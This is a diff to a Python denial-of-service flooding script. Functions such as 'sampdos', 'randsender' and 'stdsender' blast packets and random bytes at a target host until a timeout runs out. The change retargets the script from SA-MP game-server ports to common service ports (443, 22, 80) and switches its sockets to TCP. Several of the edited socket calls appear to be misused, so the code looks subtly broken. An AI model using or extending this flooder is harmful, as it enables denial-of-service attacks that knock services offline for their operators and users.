@@ -1,9 +1,9 @@
 import socket, struct, codecs, sys, threading, random, time, os, argparse
 
-proxys = open('proxy.txt').readlines()
-iyos = open('ua.txt').readlines()
-uambots = len(iyos)
-bots = len(proxys)
+
+Uams = open('ua.txt').readlines()
+uambot = len(Uams)
+
 
 # // Argparse
 ap = argparse.ArgumentParser()
@@ -67,7 +67,7 @@ def sampdos(host, port, times):
 
         timeout = time.time() + float(times)
 
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
         while time.time() < timeout:
 
@@ -87,21 +87,19 @@ def sampdos(host, port, times):
 
                 sock.sendto(packets, (host, int(port)))
 
-                if int(port) == 7777:
+                if int(port) == 443:
 
-                        sock.sendto(Attack[5], (host, int(port)))
+                        sock.send(Attack[5], (host, int(port)))
 
-                elif int(port) == 7796:
+                elif int(port) == 22:
 
-                        sock.sendto(Attack[4], (host, int(port)))
+                        sock.send(Attack[4], (host, int(port)))
 
-                elif int(port) == 7771:
+                elif int(port) == 80:
 
-                        sock.sendto(Attack[6], (host, int(port)))
+                        sock.send(Attack[6], (host, int(port)))
 
-                elif int(port) == 7784:
-
-                        sock.sendto(Attack[7], (host, int(port)))
+                
 
 
 
@@ -109,7 +107,7 @@ def randsender(host, port, times):
 
         timeout = time.time() + float(times)
 
-        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+        sock = socket.socket(socket.AF_INET, socket.IPPROTO_TCP)
 
         punch = random._urandom(int(1024))
 
@@ -129,7 +127,7 @@ def stdsender(host, times):
 
         timeout = time.time() + float(times)
 
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
